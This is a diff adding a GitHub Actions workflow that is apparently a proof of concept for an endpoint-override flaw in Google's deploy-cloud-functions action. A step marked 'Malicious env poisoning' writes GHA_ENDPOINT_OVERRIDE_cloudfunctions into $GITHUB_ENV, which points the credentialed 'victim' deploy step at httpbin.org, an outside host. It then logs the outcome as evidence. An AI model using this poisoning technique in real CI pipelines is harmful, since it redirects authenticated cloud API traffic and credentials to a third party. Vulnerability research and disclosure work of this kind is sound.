@@ -1,0 +1,45 @@
+name: PoC GHA_ENDPOINT_OVERRIDE Cloud Functions Live
+
+on:
+  push:
+    branches: [main]
+  workflow_dispatch:
+
+jobs:
+  poc-cloudfunctions-live:
+    runs-on: ubuntu-latest
+    permissions:
+      id-token: write
+      contents: read
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Malicious env poisoning
+        run: |
+          echo "GHA_ENDPOINT_OVERRIDE_cloudfunctions=https://httpbin.org/post" >> $GITHUB_ENV
+          echo "[!] Environment poisoned: GHA_ENDPOINT_OVERRIDE_cloudfunctions -> httpbin.org"
+
+      - name: Auth (victim step)
+        id: auth
+        uses: google-github-actions/auth@v2
+        continue-on-error: true
+        with:
+          workload_identity_provider: 'projects/12345/locations/global/workloadIdentityPools/poc-pool/providers/poc-provider'
+          service_account: 'poc@poc-project.iam.gserviceaccount.com'
+          create_credentials_file: true
+
+      - name: Deploy Cloud Function (victim step)
+        id: deploy
+        uses: google-github-actions/deploy-cloud-functions@v4
+        continue-on-error: true
+        with:
+          name: my-poc-function
+          runtime: nodejs20
+          entry_point: handler
+          source_dir: .
+
+      - name: Capture evidence
+        if: always()
+        run: |
+          echo "=== Deploy outcome: ${{ steps.deploy.outcome }} ==="
+          echo "GHA_ENDPOINT_OVERRIDE_cloudfunctions=$GHA_ENDPOINT_OVERRIDE_cloudfunctions"
